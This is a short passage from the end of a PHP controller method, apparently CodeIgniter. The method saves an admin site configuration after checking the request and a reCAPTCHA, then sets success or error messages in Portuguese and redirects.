                            } else $this->data['error'] = 'Não foi possível configurar o site!';
                        } else {
                            if ($config->save($this->request->getPost()))
                                $this->data['success'] = 'Site configurado com sucesso!';
                            else
                                $this->data['error'] = implode("<div style=\"margin:5px 0;\"></div>", $config->errors());
                        }
                    } else $this->data['error'] = 'Recaptcha inválido!';
                } else $this->data['error'] = 'Requisição inválida!';
                return redirect()->to(base_url('admin/config'))->with($this->rettype, $this->data);
            }
        }
        return redirect()->to(base_url('site'))->with($this->rettype, $this->data);
    }
}
